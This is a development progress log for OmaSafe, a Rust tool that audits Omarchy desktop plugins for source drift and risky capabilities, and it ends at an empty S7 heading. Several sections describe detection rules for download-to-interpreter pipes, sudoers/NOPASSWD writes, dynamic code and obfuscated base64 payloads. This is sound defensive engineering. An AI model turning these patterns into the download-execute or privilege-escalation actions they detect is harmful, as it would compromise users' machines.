# Implementation Progress

This log records the state of implementation at milestone boundaries. A
milestone is not started until the previous milestone's changes are committed
and verified.

## v0.1 M0 — Project and Reproducible Test Infrastructure

Status: **complete**

Implemented:

- Rust workspace with `omasafe-cli`, `omasafe-core`,
  `omasafe-plugin-trust`, and `omasafe-report` crates.
- Shared error type and XDG config/state/cache path discovery.
- Versioned JSON report envelope (`omasafe.report.v1`).
- CLI skeleton with version, path, and inventory smoke commands.
- Workspace build artifacts excluded through `.gitignore`.

Verification:

```text
cargo fmt --all -- --check
cargo test --workspace
cargo run -p omasafe-cli -- plugins inventory --format json
```

Known limitation: inventory currently returns an explicit coverage limitation;
filesystem reconciliation, shell output parsing, and Git metadata collection
belong to M1.

## v0.1 M1 — Installed Inventory

Status: **complete**

Implemented:

- Filesystem-first collection from `~/.config/omarchy/plugins`.
- Optional `omarchy plugin list --json` parsing with visible failure/absence
  coverage limitations.
- Reconciliation of shell IDs with plugin directories without following
  symlinks.
- Manifest schema validation and built-in, Git-managed, cloned/local, backup,
  malformed, and unscannable classifications.
- Git repository URL, `HEAD`, tree OID, and dirty working-tree state.
- Active full-bar detection and disclosure when a non-built-in bar replaces it.
- Tests for malformed manifests, symlinks, shell reconciliation, non-Git
  plugins, dirty Git checkouts, and missing remotes.

Verification:

```text
cargo fmt --all
cargo test --workspace
cargo run -p omasafe-cli -- plugins inventory --format json
```

Known limitations: built-in plugin directories may be outside the user plugin
directory and are therefore represented from shell metadata only. Source
content digests, marketplace correlation, and trust baselines belong to M2/M3.

Next: **v0.1 M2 — Marketplace catalog correlation**.

## v0.1 M2 — Marketplace Catalog Correlation

Status: **complete**

Implemented:

- Bounded catalog parsing with SHA-256 file identity and registry provenance.
- Explicit `root-plugin`, `monorepo`, and `suite` layout handling; unknown
  layouts are reported as incomplete.
- Repository normalization and correlation by both plugin ID and repository.
- Listed, unlisted, conflict, incomplete, and installed-differs states.
- Verification, validated-commit, upstream-moved, retrieval-time, generation,
  and registry-commit claims remain attributed to the snapshot.
- Immutable-commit Git fetch support with no tags, atomic private cache writes,
  and rollback detection against the last accepted snapshot.
- CLI catalog correlation using `--catalog PATH --catalog-commit COMMIT`.
- Fixtures and tests for malformed/oversized/conflicting data, normalization,
  cache replacement, unknown layouts, and provenance.

Verification:

```text
cargo fmt --all -- --check
cargo test --workspace
cargo run -p omasafe-cli -- plugins inventory --format text \
  --catalog fixtures/marketplace/catalog.json --catalog-commit fixture-commit
```

Known limitation: the checked-in fixture is intentionally small. The frozen
2026-08-20 689-entry catalog remains a release-corpus verification input and
must be run through the same bounded parser before v0.1 release.

Next: **v0.1 M3 — Source identity and trust baseline**.

## v0.1 M3 — Source Identity and Trust Baseline

Status: **complete**

Implemented:

- Immutable Git commit/tree identity plus normalized content identity for
  dirty and non-Git plugins.
- Deterministic path, mode, type, and byte ordering with bounded file and byte
  limits; symlinks are recorded as metadata and never followed.
- Digest-only `SourceIdentity` and generic trust-history record types.
- Private, atomic, versioned trust history under the XDG state directory.
- Interactive `plugins trust ID` review and unattended trust requiring `--yes`
  plus an exact expected identity.
- Tests proving deterministic identity, relevant-content changes, history
  round trips, and the existing malformed/symlink/dirty cases.

Verification:

```text
cargo fmt --all -- --check
cargo test --workspace
cargo run -p omasafe-cli -- plugins inventory --format json
cargo run -p omasafe-cli -- plugins trust ID --yes \
  --expected-head HEAD --expected-tree TREE --expected-digest SHA256
```

The smoke trust command wrote only to the local XDG state directory; no trust
contents are stored in the repository.

Known limitation: baseline comparison and drift notifications are part of M4/M5;
M3 records trust history but does not yet expose `plugin status` or diff review.

Next: **v0.1 M4 — Diff and review workflow**.

## v0.1 M4 — Diff and Review Workflow

Status: **complete**

Implemented:

- `plugins status ID` compares the installed source identity with the latest
  trust baseline and reports untrusted, unchanged, or changed state.
- `plugins diff ID` compares the trusted Git revision with the installed
  revision, using the live worktree when direct edits make the checkout dirty.
- Bounded text diffs with binary/mode changes preserved by Git, and explicit
  unavailable/truncated limitations.
- Safe argv-only Git invocation with constrained diff references.
- `plugins review ID` actions for acknowledge, scoped exclusion, rebaseline,
  and restoring the previous baseline.
- Rebaseline/restore/exclusion decisions require explicit confirmation and
  reasons; accepting a revision does not create a future ignore rule.
- Tests cover Git diff availability, invalid references, changed content,
  identity comparison, and versioned decision history.

Verification:

```text
cargo fmt --all -- --check
cargo test --workspace
cargo run -p omasafe-cli -- plugins status ID --format json
cargo run -p omasafe-cli -- plugins diff ID
cargo run -p omasafe-cli -- plugins review ID \
  --action acknowledge --reason "reviewed" --scope current-source --yes
```

Known limitation: scheduling, alert deduplication, and desktop notification
delivery belong to M5; M4 exposes the review decisions but does not schedule
them.

Next: **v0.1 M5 — Drift scheduling and native-update detection**.

## v0.1 M5 — Drift Scheduling and Native-Update Detection

Status: **complete**

Implemented:

- `omasafe-cli scan` performs post-change detection against trusted identities.
- Alerts cover source drift, missing trusted plugins, unscannable plugins, and
  meaningful inventory coverage loss.
- Alert keys are persisted atomically in private XDG state and unchanged
  alerts are deduplicated.
- `--notify` delivers critical alerts through `notify-send`, independently of
  the bar widget; unavailable notification services are disclosed.
- `schedule install` is an explicit opt-in systemd user timer installation for
  daily persistent scans.
- Native Omarchy updates and direct editor changes are both observed after the
  live tree changes; no update path is intercepted or required.
- Tests cover quiet scans, state deduplication, and existing identity/diff
  negative cases.

Verification:

```text
cargo fmt --all -- --check
cargo test --workspace
cargo run -p omasafe-cli -- scan --format json
```

Known limitation: the systemd install command is opt-in and requires a working
user systemd session. Bar UI integration belongs to M6.

Next: **v0.1 M6 — Thin Omarchy UI**.

## v0.1 M6 — Thin Omarchy UI

Status: **complete**

Implemented:

- Valid standalone `bar-widget` manifest with nested `Panel.qml`.
- Alert count/state badge with quiet, attention, and unavailable states; no
  security grade or safe badge.
- Fixed argv-only CLI invocation of `omasafe-cli scan --format json`.
- Bounded JSON parsing in QML and no raw command output rendering.
- Manual scan action and a lightweight refresh timer; heavy work remains in the
  CLI/systemd path.
- Panel disclosure that OmaSafe reports changes and coverage limits rather than
  declaring plugins safe.
- CLI and desktop notification paths remain available when a third-party full
  bar replaces the bar widget.

Verification:

```text
cd ../omasafe-plugin
omarchy plugin validate .
qmllint BarWidget.qml Panel.qml
cd ../omasafe
cargo test --workspace
```

Known limitation: interactive click/open/close and shell restart lifecycle
tests require the provisioned Omarchy VM harness. The repository contains no
runtime QML dependency or privileged component.

Next: **v0.1 M7 — Packaging, signing, and release**.

## v0.1 M7 — Packaging, Signing, and Release

Status: **complete**

M7 packages, signs, and releases the already-verified v0.1 implementation; it adds
no new detection behavior.

Implemented:

- Tag-triggered release workflow (`.github/workflows/release.yml`) builds the
  locked `omasafe-cli` binary for `x86_64-unknown-linux-gnu` and publishes a
  tarball, SHA-256 file, and Cosign Sigstore bundle.
- Maintainer-GPG-signed source tags; keyless Sigstore signing for release archives.
  Detached verification is documented in [`release-signing.md`](release-signing.md).
- Generated man page, shell completions, and a deterministic
  `omasafe-provenance.json` report from the authoritative CLI surface.
- `packaging/arch/PKGBUILD` for clean-build and local package validation; AUR
  publication remains deferred.
- Static project site published from `site/` via `.github/workflows/pages.yml`,
  separate from the CLI release archive.
- The Omarchy UI plugin is maintained and released separately at
  `../omasafe-plugin/` with its own repository-root `manifest.json`.

Verification:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace
cargo run -p omasafe-cli -- provenance --format json
```

Known limitation: the release gates in [`m7-release-checklist.md`](m7-release-checklist.md)
that require the snapshot-capable Omarchy VM — clean install/upgrade/downgrade/
uninstall and the full panel lifecycle — are reproduced per release from a fresh
checkout rather than recorded here.

## Post-review hardening

The implementation review follow-up closed the critical detection, provenance,
identity, locking, and diff regressions. v0.1 (M0–M7) is feature-complete,
packaged, and signed. Automated verification covers format, clippy, workspace
tests, and hermetic CLI integration tests on the pinned stable toolchain; the
per-release clean-VM lifecycle gates are tracked in the M7 checklist.

## v0.2 planning

Status: **complete**

- [`plans/v0.2-implementation.md`](plans/v0.2-implementation.md) decomposes the
  v0.2 release into vertical slices S0–S8 with milestone traceability, strategy
  decisions (tree-sitter-qmljs primary parser subject to the M3 kill criterion;
  additive `omasafe.report.v1` analysis fields; one new `omasafe-analyzer`
  crate), risks, and per-slice exits.
- Codex plan review applied: pinned entry-point subset moved into S2,
  `--fail-on` ownership assigned, suppression CLI actions specified,
  cancellation owned by S8, traceability table corrected.

## v0.2 S0 — Analysis Foundations and Security-Surface Reverify

Status: **complete**

Implemented:

- Security-surface reverification against installed Omarchy 4.0.0-1 /
  Quickshell 0.3.0 (quickshell-git r20): anchors present, sinks unchanged, no
  import allowlist, manifest checks still path containment only; stamp
  refreshed in [`reference/omarchy-security-surface.md`](reference/omarchy-security-surface.md)
  with no rule-meaning changes.
- Shared bounded-ingest primitives extracted to `omasafe-core::bounds`: file/
  byte/metadata/diff limits shared with plugin-trust plus new tree-depth,
  time-budget, Git child-process budget, cache quota, and evidence-cap
  constants; `TimeBudget` and argv-only `run_bounded()` child execution using
  `waitid(WNOWAIT)` non-reaping exit observation, poll(2)-bounded output
  drains with per-stream caps, truncation disclosure, and process-group kill
  covering descendants on timeout or held pipes.
- New `omasafe-analyzer` crate: OmaSafe-owned rule catalog v1 seeded from the
  verified sink table (12 rules incl. high-priority polkit/session-lock/PAM),
  severity table v1, capability/language taxonomies, policy identity with
  limits and rule-catalog content fingerprints, and analysis fingerprint
  canonicalization over sorted normalized results (fallible path
  normalization; confidence participates).
- `omasafe-report` gained the documented additive `analysis` module
  (`omasafe.analysis.v1`) with the optional analysis section and policy
  identity schema; inventory/trust outputs remain byte-compatible.
- `rules list [--format text|json]` CLI command rendering the catalog and
  policy identity; usage string, CLI surface, man page, and completions
  regenerated.
- Codex pre-commit review iterated to COMMIT-READY: fixed descendant cleanup,
  unbounded buffering, bypassable/lossy fingerprint normalization, panics on
  traversal, presentation-limit leakage into policy identity, and a dropped
  public API re-export.

Verification:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace          # 16 analyzer unit tests + CLI integration
./scripts/generate-cli-assets.sh --check
cargo run -p omasafe-cli -- rules list --format json
```

Known limitations: detectors do not exist yet (catalog publication precedes
detector availability so IDs are stable); the QML parser slot in the policy
identity records `lexical-fallback-unassigned` until the S2 decision;
plugin-trust still uses its own walker without depth/time enforcement until
the S1 ingestion frontend adopts the shared budgets.

Next: **v0.2 S1 — Payload inventory end-to-end**.

## v0.2 S1 — Payload Inventory End-to-End

Status: **complete**

Implemented:

- `omasafe-analyzer::payload`: deterministic file classification (QML,
  JavaScript, shell, Python, extensionless executables, ELF/Mach-O/PE native
  magics, data binaries via NUL sniffing) with precedence native-magic >
  extension > shebang (exact interpreter basenames; `MZ` requires the PE
  signature at `e_lfanew`), and coverage states
  `analyzed|partial|skipped|truncated|unsupported|unreferenced` — pre-S2 all
  fully read files report `unsupported`, never clean.
- `omasafe-analyzer::ingest`: one bounded walker feeding three frontends —
  installed plugin trees, local directories (`scan-plugin --path`), and
  immutable Git revisions (`scan-plugin --git URL --revision`) read as raw
  objects via `ls-tree -l -z` + per-object `cat-file` (no checkout, filters,
  hooks, submodules, or LFS). Enforced limits: file count, aggregate bytes
  (precise, probe-based), tree depth, elapsed time; oversize/budget-exhausted
  entries become sampled-digest `Skipped` records; symlinks stay metadata and
  are never followed; entry-bomb directories skip whole with disclosure;
  non-UTF-8 Git paths degrade lossily instead of aborting.
- Pinned-revision fetch: HTTPS-only URLs (credential-bearing authorities
  rejected before any Git call), revision-length-aware object format init,
  argv-only children under remaining-budget caps with truncation-tolerant
  reads, whole-cache flock serialization, and cache quota enforced both pre-
  and post-fetch (offending repository removed on violation).
- CLI: `plugins analyze PLUGIN_ID` and `scan-plugin (--path|--git+--revision)`
  emit inventory reports through the additive `omasafe.analysis.v1` section
  with policy identity, empty-set fingerprint, coverage-state counts, and full
  entry list; text views are capped at 200 rows; `--fail-on` accepted and
  validated as a documented no-op until detectors land.
- Surface/man/completions regenerated; integration tests cover bundled
  executable payloads, binary blobs, symlinks, determinism, argument strictness,
  credentialed-URL rejection, quota symlink safety, and oversized-repo-blob
  degradation to Skipped.
- Codex pre-commit review iterated to COMMIT-READY: fixed unenforced output
  caps, missing git-side aggregate/time accounting, cache-quota races,
  filesystem softness, credential leakage paths, classification precedence,
  and CLI failure semantics.

Verification:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace          # 93 tests across 12 suites
./scripts/generate-cli-assets.sh --check
cargo run -p omasafe-cli -- plugins analyze io.example.cli --format json
```

Known limitations: no language analyzers exist yet, so every fully ingested
file is explicitly `unsupported`; Git blob sampling is head-only (no seekable
tail in object storage); a setsid-descendant escaping its process group can
still hold pipes past the budget (disclosed as truncation); `--fail-on`
remains a validated no-op until S3; per-repository submodule entries are
recorded but not traversed by design.

Next: **v0.2 S2 — Parser spike, measurement, and ADR**.

## v0.2 S2 — Parser Spike, Measurement, and ADR

Status: **complete**

Decision (ADR 0001, accepted): **tree-sitter-qmljs 0.3.1 on tree-sitter
0.26.13** behind the `qml-parser` crate feature (on by default for the CLI
build); exact-pinned dependencies; grammar ABI 14 pinned by test.

Implemented:

- `corpus/entry-points.json`: deterministic stratified sample of 50 community
  plugins from the frozen catalog snapshot (commit `964dc08d…`), each pinned
  by `upstreamObservedCommit`; generator `scripts/generate-entry-point-corpus.py`
  reproduces it exactly and records provenance + selection rule in the file.
- `omasafe-analyzer::qml` (feature-gated): inert parse trees plus coverage
  metrics — leaf-span byte union, non-whitespace gap materiality, ERROR/
  missing-node counts, line metrics, explicit `parse_failed` state, and a
  strict `parses_cleanly()` (no errors, no missing items, zero non-whitespace
  gap bytes). Policy identity now reports `tree-sitter-qmljs/0.3.1` when the
  feature is on and `lexical-fallback-unassigned` when off.
- Measurement harness (`examples/qml-coverage.rs`): fetches every pinned
  revision through production `ensure_pinned_repository` into disposable bare
  cache (one retry on transient budget exhaustion), reads QML as raw objects,
  discovers entry points from `manifest.json` blobs, emits versioned JSON.
- Measured results (2026-08-25): 50/50 plugins ingested; **119/119 entry-point
  files clean (100%)**; **594/594 QML files clean (100%)**; **0 non-whitespace
  uncovered bytes across 5,828,386 bytes**. Kill criterion met decisively —
  no lexical-fallback downgrade needed.
- qmllint probe (Qt 6.11.2): output dominated by environment-dependent import
  resolution; documented as optional human-advisory signal only, never the
  capability engine; QQmlSA stays a future option.
- ADR `docs/adr/0001-qml-parser.md`: decision, method, numbers, unsupported-
  syntax behavior, lexical-fallback semantics via policy identity, report
  metadata fields (`analysis.parser` wiring lands with S3 detectors).

Verification:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace                      # 101 tests (feature off)
cargo test --workspace --features omasafe-analyzer/qml-parser   # 101 (on)
./scripts/generate-cli-assets.sh --check
codex review iterated to COMMIT-READY (ABI truth, exact pins, parse_failed
state, line-metric retention, segment-exact '..' rejection, test strength)
```

Known limitations: harness is dev tooling outside the shipped CLI surface;
oversized-QML records carry zeros rather than metrics (disclosed per record);
generator layout allocation is proportional to catalog composition (49 root-
plugin / 1 suite), so suites are under-weighted relative to their QML mass;
qmllint remains unexercised by CI.

Next: **v0.2 S3 — Embedded-JS analysis, first capabilities, invocation edges**.

## v0.2 S3 — Embedded-JS Analysis, First Capabilities, Invocation Edges

Status: **complete**

Implemented:

- `omasafe-analyzer::detect`: one bounded pass over an ingested inventory
  producing findings (fingerprintable, suspicious-provenance only),
  capability occurrences (context, never assertions of intent), and resolved
  invocation edges. AST-backed QML analysis via the S2 parser; standalone
  `.js` and fallback builds are line-lexical with `LexicalFallback` labels.
  Rule contract enforced by construction: findings require shell-interpreter
  chains (`sh -c …`, basename-aware for `/bin/sh`), network-response data
  inside execution arguments, or computed reference sinks — same-file
  co-occurrence and bare dynamic identifiers stay capability-only.
- New catalog rule `oma.qml.dynamic-reference` (Low) for computed
  Loader/FileView sources; RULE_CATALOG_VERSION bumped to 2.
- Invocation edges: literal references resolve relative to the referencing
  file first, then repository root; traversal segments, schemes (any colon),
  spaces, directories, and symlinks never resolve. Targets gain additive
  `invocation_target = true`; fully-observed-clean files report the now-live
  `Unreferenced` coverage state (`Partial` when syntax errors degrade a
  parse). The S1 bundled-executable fixture story completes: QML pointing at
  a shell payload now exposes its edge.
- Analysis fingerprint covers sorted findings AND capabilities
  (`fingerprint_analysis`); golden pins per feature configuration catch
  canonicalization drift. Workspace version bumped to 0.2.0 so policy
  identity moves with detector introduction.
- CLI: content readers verify identity before analysis — O_NOFOLLOW|
  O_NONBLOCK opens with fstat regular-file confirmation, size equality, and
  SHA-256 match against the ingested digest (git readers: bounded cat-file by
  object id with truncation/status checks). Reader failures degrade into
  disclosed limitations, never silent divergence. Capability records carry
  their covering rule id/explanation/guidance.
- `--fail-on SEVERITY` wired end-to-end: findings remain success; threshold
  met returns exit code 4 through the normal run path, documented in the man
  page separately from scan's exit 3. Reports gain additive `findings`,
  `capabilities`, `invocation_edges`, and `parser` sections.

Verification:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace          # 122 tests (feature off)
cargo test --workspace --features omasafe-analyzer/qml-parser  # 122 (on)
./scripts/generate-cli-assets.sh --check
codex review iterated to COMMIT-READY across six rounds: provenance-only
findings (co-occurrence removed), occurrence-complete comment-aware lexical
scanning (quote-aware // stripping), scheme-exact edge rejection,
digest-bound re-reads, fingerprint/capability inclusion, state semantics.
```

Known limitations: Process/FileView type matching is not import-qualified
(same-named custom components can produce capability false positives);
lexical mode judges only single-line spans (multi-line argument composition
is AST-mode territory); `plugins analyze --fail-on` is exercised indirectly
via scan-plugin tests; git-sourced CLI analysis is covered at the analyzer
API level (production fetch is HTTPS-only, so local file:// URLs are rightly
rejected end-to-end).

Next: **v0.2 S5 — Suppressions, event separation, determinism canary**.

## v0.2 S4 — Full Rule Set and Priority Surfaces

Status: **complete**

Implemented:

- **Priority surfaces**: third-party imports/usages of polkit
  (`Quickshell.Services.Polkit`), PAM (`PamContext`, `Services.Pam`), and
  session-lock (`WlSessionLock*`) APIs are immediate High findings per the
  verified surface doc; clipboard and Hyprland/Wayland/Wlr tokens record
  capability context only.
- **Remaining capability rules**: `oma.qml.dynamic-code` (Medium) detects
  eval/Qt.createQmlObject/new Function/atob construction;
  `oma.qml.obfuscated-payload-indicator` (Low) flags base64-shaped literals
  with exact 63/64 boundary and letters+digits requirements; FileView paths
  toward autostart/systemd-user locations surface persistence-location
  context findings.
- **Minimal script rules** (`oma.script.*` / `oma.python.*`
  download-execute + privilege-escalation, High): bundled shell/Python
  payloads are lexically scanned and always labelled `partial`; findings
  require actual download-to-interpreter pipes or sudoers/NOPASSWD writes —
  read-only inspection and bare sudo/pacman/systemctl stay capability-level.
  Comment stripping is language-exact: scheme-guarded `//` for QML/JS,
  any-position `#` for Python, word-boundary `#` for POSIX shell.
- **Plugin-kind context**: manifest.json kinds feed the
  `oma.context.replaces-bar` result and headless-service persistence
  capability; malformed manifests disclose limitations instead of failing
  silently.
- **Marketplace Baseline V3 equivalence map** (`equivalence.rs` + embedded
  JSON): all five upstream finding ids and seven capability ids recorded
  with explicit coverage relations against verification commit `964dc08d…`;
  staleness API marks maps stale when the cached snapshot records a newer
  external baseline version (`equivalence-map-stale:...` limitation);
  policy identity now carries
  `equivalence_map_version = omarchy-marketplace-baseline-v3/1`. Reports add
  an additive `equivalence` summary object.
- **Priority ordering**: rendered findings sort severity-descending with
  stable tie-breakers so High/Critical findings dominate report views.

Verification:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace          # parser-backed build
cargo test --workspace --no-default-features   # true lexical-fallback build
./scripts/generate-cli-assets.sh --check
```

Codex review produced three blockers (missing new-Function detection;
unsound NOPASSWD/comment handling; incomplete equivalence map) plus
concerns/nits — every one fixed and pinned with tests before commit. The
final re-review round (run after credits returned) returned
CHANGES-REQUIRED with three further blockers, all verified real and fixed
in the follow-up hardening commit: (1) `sudoers` mention substituted for a
write indicator, so non-writing NOPASSWD/sudoers mentions could yield High
findings — both grant predicates now require a real write context
(`>`, tee, visudo, sed -i, chattr, `.write(`), with read-only first words
(grep/cat/less/head/tail/stat/journalctl) still suppressing; (2) the comment
stripper failed to advance past opening quotes, so `#`/`//` inside string
literals truncated live code, and shell `#` after control operators was not
recognized — cursor fixed and shell word starts extended to
whitespace/`;&|(`; (3) the equivalence staleness reader read cached
catalog.json unbounded — now honors MAX_CATALOG_BYTES like the loader. High-
finding provenance is quote-aware (`unquoted_text`): pipes and dynamic-code/
download spellings inside string literals no longer create findings.
Pinning tests added for each fix plus: exact 12-id equivalence set and
verification SHA, per-word read-only suppression, quoted-spelling negatives,
band tie-break order (path → rule → line), wrapped-catalog staleness shapes,
simultaneous inventory+analysis limitations in text output, and
`plugins analyze --fail-on` exit 4.

Gate integrity correction found during this round: omasafe-cli enabled
`omasafe-analyzer/qml-parser` through its dependency line, so feature
unification made plain `cargo test --workspace` parser-backed — the
documented "feature off" configuration never actually ran. The CLI now owns
a default `qml-parser` feature alias (same shipped behavior per ADR 0001),
the lexical configuration is exercised with `--no-default-features`, and
two mis-gated assertions (git-sourced confidence in the ingestion test,
policy/parser metadata in CLI tests) derive their expectations from the
compiled parser identity instead of hard-coded values.

Known limitations: Process/FileView type matching remains
import-unqualified; AST persistence detection covers static paths only
(dynamic Quickshell.env concatenations surface as dynamic-reference
findings and via the lexical path); remote-build/cargo-pinning/
shared-temp-PID baseline families are explicitly not-covered in the map.

## v0.2 S5 — Suppressions, Event Separation, Determinism Canary

Status: **complete**

Implemented:

- **Scoped suppressions** (`omasafe-core::suppress` + XDG config): records
  carry `{rule_id, plugin_id?, path_scope?, reason, created_at, active,
  reinstated_at?}` in `~/.config/omasafe/suppressions.json` behind flock +
  atomic-write. Reinstate flags records inactive instead of deleting — the
  audit trail survives; re-suppression appends. Matching is rule-exact,
  plugin-context-aware (plugin-scoped records never match plugin-less
  `scan-plugin` contexts), and segment-exact on path scopes (`assets`
  never matches `assets_backup/…`). Creation validates non-empty reason and
  traversal-free relative scope.
- **Presentation/enforcement only**: `emit_analysis_report` filters rendered
  findings AFTER fingerprinting; stored results, capabilities, edges, and
  `analysis_fingerprint` are byte-identical under suppression (pinned by
  test). Suppressed findings are excluded from both report views AND
  `--fail-on` enforcement; reports disclose an additive `suppressions`
  summary (`applied` list + active count). An unreadable suppressions file
  fails open toward more visibility via a `suppressions-unreadable:`
  limitation.
- **CLI surface**: `plugins review ID --action suppress|reinstate --rule
  RULE_ID [--path SCOPE] --reason TEXT --yes` (separate validation path from
  the source-drift/missing-plugin/lost-coverage enum); `rules explain
  RULE_ID [--format]` prints definition + marketplace equivalence entries;
  man page/completions/cli-surface regenerated.
- **Event separation**: `ScanState` gains additive per-plugin
  `analysis_events` `{source_identity, policy_identity, fingerprint,
  finding_rule_ids, capability_kinds}`. Opt-in `scan --include-analysis`
  classifies against the stored snapshot with distinct wording: source
  changed → drift alert only (baseline refreshed silently); policy changed →
  `analyzer-policy-update` re-evaluation notice; both unchanged but
  fingerprint moved → `fingerprint-instability` error. Clean rounds report
  `new-capability` / `finding-regression` growth alerts. Policy identity
  compares canonically (Value-normalized JSON). Default scans never touch
  analysis events; registry/correlation claims cannot clear any of them by
  construction. All events flow the standard dedup/notify/only-new machinery.
- **Determinism canary**: `fixtures/canary/` pinned inputs +
  `scripts/determinism-canary.sh` — builds, runs `scan-plugin` twice into
  isolated HOMEs, diffs full `result.analysis`; mismatch preserves a repro
  bundle (`determinism-canary-failure/`). CI runs it with artifact upload on
  failure, plus the previously-missing lexical-config test run
  (`cargo test --workspace --no-default-features`).

Verification:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings          # both configs
cargo test --workspace                     # 167 tests (parser-backed)
cargo test --workspace --no-default-features               # 157 tests (lexical)
./scripts/generate-cli-assets.sh --check
./scripts/determinism-canary.sh
```

Codex review returned CHANGES-REQUIRED; every blocker and concern was
verified real and fixed in the follow-up hardening commit: growth alerts
are classified explicitly (drift rounds can never emit them) and are no
longer masked by policy-update/instability rounds — analyzer improvement
usually IS the fingerprint change, so those rounds compare sets too, with
empty→first transitions alerting like any growth (pinned by test); the
alert-retention pass is namespace-aware so a notifying DEFAULT scan can
never clear `analysis:*` dedup state (pinned by test); duplicate plugin ids
are disclosed instead of aliasing event snapshots; suppression path scopes
are canonicalized for storage AND reinstate comparison (`assets` ≡
`assets/`); an unreadable suppressions file is detected via read-with-
NotFound-special-case instead of `Path::exists`, so permission failures get
the required disclosure; the canary repro bundle now copies the fixture
tree plus binary hash and commit; digest-bound filesystem/git readers gain
direct pinning tests (symlink swap, FIFO swap via O_NOFOLLOW/O_NONBLOCK +
fstat, size/digest drift, missing objects).

Known limitations: CLI-created suppressions are always plugin-scoped (the
store supports global path-only records for plugin-less contexts, but no
creation path exists yet); fingerprint instability is detected only for
plugins analyzed twice under identical identity, so first observations are
quiet baselines by definition; the canary compares run-vs-run within one
build rather than across tool versions (golden pins cover cross-version
stability, and `fingerprint_analysis` takes no version input by
construction).

Next: **v0.2 S6 — Pinned corpus, FP budget, validator parity**.

## v0.2 S6 — Pinned Corpus, FP Budget, Validator Parity

Status: **complete**

Implemented:

- **Corpus manifest** (`fixtures/corpus/manifest.json`, generator
  `scripts/generate-corpus-manifest.py`): every community catalog entry with
  an https repository and a valid pinned `upstreamObservedCommit`, sorted by
  id — 1281 plugins from the frozen snapshot (catalog commit `964dc08d…`,
  retrieved 2026-08-25; the plan's "653" predates the current snapshot size,
  which the manifest records in its provenance block). Fields per plugin:
  repository, commit, layout, manifest path (root-plugin layouts; null
  elsewhere with runner-side discovery), kind, status, expected
  availability. No plugin content is committed; live-catalog refresh stays a
  manual regeneration against a new frozen snapshot.
- **Expectation ledger** (`fixtures/corpus/expectations/dispositions.jsonl` +
  README): append-only JSONL keyed `{plugin_id, commit, rule_id}` with
  `true-positive`/`false-positive` dispositions and required human notes;
  last record per key wins. Starts intentionally empty.
- **Runner** (`scripts/run-corpus.py`): deterministic evenly-spaced PR
  subsets (`--sample N`) or full corpus (`--full`); shallow-fetches each
  pinned commit into a disposable cache (re-clone on any drift), scans each
  clone via `scan-plugin` under an isolated XDG environment so local
  suppressions/snapshots cannot influence results, classifies findings
  through the ledger, and publishes per-rule TP/FP/untriaged counts plus
  incomplete repositories. Unclonable or unanalyzable repositories are
  **incomplete, never clean**. `--gate-high` implements the release gate:
  fails on any known or untriaged high-severity result (genuine highs are
  expected and fine).
- **Manifest checks for plain Arch use**
  (`omasafe-marketplace::manifest` + `validate-manifest` example): full
  mirror of the native validator for recorded Omarchy 4.0.1 — schemaVersion
  number equality, required fields, id charset/`..`/reserved-namespace
  rules, kinds table entry-point coverage, safe relative existing entry
  points (newline/absolute/traversal), barWidget.defaultSection enum, and
  symlink refusal outside `.git`. Unit tests pin every check positive and
  negative.
- **Validator parity canary** (`scripts/validator-parity.py`): runs native
  `omarchy plugin validate` and OmaSafe's mirror over the same clones and
  compares pass/fail verdicts; disagreement fails the build for the
  recorded version. A missing runtime, or a runtime newer than the
  recording, degrades validator coverage VISIBLY (report status
  `degraded` + loud log line) instead of silently passing; undiscoverable
  manifests count incomplete.
- **CI provisioning**: `corpus-subset` job in ci.yml (deterministic sample
  of 12 per PR, reports as artifacts) and scheduled
  `corpus-nightly.yml` (full corpus + parity, five-hour budget, artifacts
  always uploaded). The nightly is informational until dispositions accrue;
  `--gate-high` wires the release gate at release time. Parity runs on
  GitHub runners degrade visibly by design; real comparison points
  `CORPUS_PARITY_RUNNER` at a runner carrying the recorded Omarchy version.

Verification:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings          # both configs
cargo test --workspace                     # 178 tests (parser-backed)
cargo test --workspace --no-default-features               # 168 tests (lexical)
./scripts/generate-cli-assets.sh --check
./scripts/determinism-canary.sh
run-corpus.py --sample 12   # 12 scanned, 8 untriaged, 0 incomplete
validator-parity.py         # 12 compared, 0 disagreements; degraded path exercised
```

Codex review returned CHANGES-REQUIRED with reproduced cases; all blockers
and concerns were fixed in the follow-up hardening commit. Both runners now
share `scripts/corpus_common.py` (one sampler, one plugin-directory
resolver, one bounded-git runner, one ledger parser) so they can never
evaluate different targets; the runner resolves recorded manifest paths and
discovers depth-2 manifests by id (verified live on a monorepo entry).
Cache entries are trusted only when HEAD matches the pin AND the worktree
is pristine — a poisoned tracked file forces a fresh clone (verified live);
parity independently re-verifies pins before comparing. Inventory coverage
limitations outside a benign set, truncated/skipped entries, and analysis
failures count INCOMPLETE instead of passing gates as clean scans. The
manifest mirror was corrected to native jq/find semantics with a live-
derived edge matrix: numeric schemaVersion equality (1.0 passes), jq `-r`
scalar coercion for ids and entry-point values (123 → "123"), multi-line
array/object rendering rejected as newlines, no mirror-only size cap,
`.git` pruned by name before the type test, symlinked roots refused, and no
symlink-walk depth limit — each case cross-checked against the installed
4.0.1 binary. Parity verdicts are three-state (valid/invalid/error) where
errors always disagree; git fetches are time-bounded; CLI arguments reject
empty/negative samples and combined modes; the ledger parser validates
40/64-hex commits, disposition vocabulary, and required notes; the
generator verifies meta file-digest consistency, dedupes duplicate catalog
ids deterministically, and reproduces the committed manifest byte-
identically from the frozen snapshot (`scripts/test_corpus_tooling.py`
pins all of it).

Known limitations: parity verdicts compare pass/fail only (not per-issue
prose); monorepo/suite discovery accepts any depth≤2 directory declaring the
plugin id; the nightly runner variable must be provisioned before release
for real (non-degraded) parity — that ops cost is owned explicitly per the
plan; corpus findings are untriaged by definition until humans accrue
dispositions.

Next: **v0.2 S7 — Reviewed update workflow**.

## S7 — Reviewed update workflow (2026-08-26)

